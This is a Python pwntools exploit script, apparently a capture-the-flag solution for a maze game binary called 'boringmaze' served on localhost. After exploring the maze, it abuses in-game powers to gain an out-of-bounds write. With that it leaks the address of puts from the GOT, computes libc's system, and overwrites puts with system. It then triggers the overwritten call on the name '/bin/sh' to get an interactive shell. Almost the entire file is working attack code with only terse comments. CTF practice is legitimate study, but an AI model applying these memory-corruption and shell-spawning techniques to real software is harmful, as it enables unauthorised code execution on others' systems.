#!/usr/bin/python3
from pwn import *

N = 65

HOST = "localhost"
PORT = 1337

LIBC_PUTS = 0x7c9e0
LIBC_SYSTEM = 0x4e520

maze = [['?' for _ in range(N)] for _ in range(N)]


view_range = 1

def print_maze():
    for i in range(N):
        print("".join(maze[i]))

def get_view(pos):
    global p
    (x, y) = pos
    for i in range(2*view_range + 1):
        l = p.recvline(keepends=False)
        assert len(l) == 2*view_range + 1, f"unexpected line: {l}"
        for j in range(2*view_range + 1):
            maze[x - view_range + i][y - view_range + j ] = chr(l[j])

def get_neighbours(pos):
    (x, y) = pos
    l = []
    if x > 0:
        l.append((x-1, y))
    if x < 63:
        l.append((x + 1, y))
    if y > 0:
        l.append((x, y-1))
    if y < 63:
        l.append((x, y + 1))
    return l

def dir_to_move(cur_dir, dst_dir):
    if cur_dir == dst_dir:
        return 'W'
    elif set([cur_dir, dst_dir]) in [{'E', 'W'}, {'N', 'S'}]:
        return 'S'
    elif (cur_dir, dst_dir) in [('E', 'N'), ('N', 'W'), ('W', 'S'), ('S', 'E')]:
        return 'A'
    else:
        return 'D'
    
def pos_to_dir(start, end):
    p_x, p_y = start
    x, y = end
    if p_x == x:
        if p_y == y + 1:
            return "W"
        else:
            assert p_y == y - 1
            return "E"
    else:
        assert p_y == y
        if p_x == x + 1:
            return "N"
        else:
            assert p_x == x - 1
            return "S"

revdir = {
    "N": "S",
    "E": "W",
    "W": "E",
    "S": "N"
}

def discover_maze():
    pred = [[None for _ in range(65)] for _ in range(65)]
    queue = [(1, 1)]
    pred[1][1] = -1
    start()
    pos = (1, 1)
    get_view(pos)
    dir = "E"
    while len(queue) > 0:
        next = queue.pop()
        nb = get_neighbours(next)
        cmd = ""
        while pos != next and pos not in nb:
            (x, y) = pos
            ndir = pos_to_dir(pos, pred[x][y])
            cmd += dir_to_move(dir, ndir)
            pos = pred[x][y]
            dir = ndir
        if pos != next:
            ndir = pos_to_dir(pos, next)
            cmd += dir_to_move(dir, ndir)
            pos = next
            dir = ndir
        p.sendline(cmd)
        get_view(pos)
        for (x, y) in get_neighbours(pos):
            if maze[x][y] == ' ' and pred[x][y] is None:
                pred[x][y] = pos
                queue.append((x, y))
            elif maze[x][y] == "!":
                print_maze()
                print(pos, dir)
                
                dirs= ""
                cur = (x, y)
                predec = pos
                while predec != -1:
                    dirs += pos_to_dir(predec, cur)
                    cur = predec
                    predec = pred[cur[0]][cur[1]]
                dirs = "E" + dirs[::-1]
                print(dirs)
                moves = [dir_to_move(dirs[i], dirs[i+1]) for i in range(len(dirs) - 1)]
                print("".join(moves))
                back = [revdir[c] for c in dirs[::-1]]
                moves = [dir_to_move(back[i], back[i+1]) for i in range(len(back) - 1)]
                print("".join(moves))
                exit()
    print_maze()

def start():
    global p
    #p = process("./boringmaze")
    p = remote(HOST, PORT)
    p.recvline()
    p.recvline()
    #will be useful...
    p.sendline(b"/bin/sh")
    p.recvline()
    p.recvline()
    p.recvline()

def wall_transform(init, target):
    diff = target - init
    return b"M"*((171 * diff) % 256) #cause 171 * 3 = 1 [256], and '#' - ' ' = 3


#obtained from discover_maze
PATH_TO_MAGE = b"WWDWWWWWDWAWWWAWDWWWAWAWWWDWWWDWAWDWWWDWWWAWWWAWWWDWAWDWDWAWWWAWDWAWWWDWWWDWWWDWAWWWWWWWWWDWAWAWWWWWWWAWWWDWWWAWAWDWWWAWDWWWDWWWAWDWWWAWWWDWDWWWAWDWAWDWWWWWWWAWWWWWDWAWDWDWW"
MAGE_TO_START = b"WWAWAWDWAWWWWWDWWWWWWWAWDWAWDWWWAWAWWWDWWWAWDWWWAWWWAWDWWWAWDWDWWWAWWWDWWWWWWWDWDWAWWWWWWWWWDWAWWWAWWWAWWWDWAWDWWWDWAWAWDWAWWWDWWWDWWWAWWWAWDWAWWWAWWWDWDWWWAWDWWWDWAWWWWWAW"

def attack():
    global p
    start()
    for _ in range(3):
        p.recvline()

    #go see the mage, obtain "wall" power
    p.sendline(PATH_TO_MAGE)
    for _ in range(6):
        p.recvline()
    p.sendline(b"M")
    for _ in range(5):
        p.recvline()

    #pop a new mage using the wall power, receive "vision" power
    p.sendline(wall_transform(ord(' '), ord('!')) + b"W")
    for _ in range(6):
        p.recvline()
    p.sendline(b"V")
    for _ in range(7):
        p.recvline()
    
    #same
    p.sendline(wall_transform(ord('#'), ord('!')) + b"W")
    for _ in range(6):
        p.recvline()
    p.sendline(b"V")
    for _ in range(9):
        p.recvline()

    #go back to maze entrance
    cmd = b"SWW" + MAGE_TO_START
    #move under the "can_teleport" variable
    cmd += b"SWM" +12*b"W" + b"M" + 14*b"W" + b"MWWMWWM" + 8*b"W" + b"M" + 6*b"W" + b"MWW"
    #break the wall under it, use wall power to enable teleport
    cmd += b"DSMWM"
    #teleport to just under the address of puts in GOT, leak the libc
    cmd += b"T" + p32(2**32-3) + p32(15)
    p.sendline(cmd)
    p.recvn(16)
    addr_puts = u64(p.recvn(7) + b"\0")
    print(f"Puts at {hex(addr_puts)}")
    p.recvn(33)
    addr_system = addr_puts - LIBC_PUTS + LIBC_SYSTEM

    #overwrite puts with system in GOT
    cmd = b""
    for i in range(3):
        cmd += b"T" + p32(2**32-3) + p32(12 + i)
        cmd += wall_transform(p64(addr_puts)[i], p64(addr_system)[i])
    
    #teleport back into the maze to allow movement
    cmd += b"T" + p32(1) + p32(1)
    #spawn the treasure with the wall power
    cmd += wall_transform(ord("#"), ord("$"))
    #trigger the treasure, with puts replaced by system -> will call system on our name
    cmd += b"W"
    #context.log_level = "DEBUG"
    p.sendline(cmd)
    p.interactive()


#context.log_level = "DEBUG"
attack()
#discover_maze()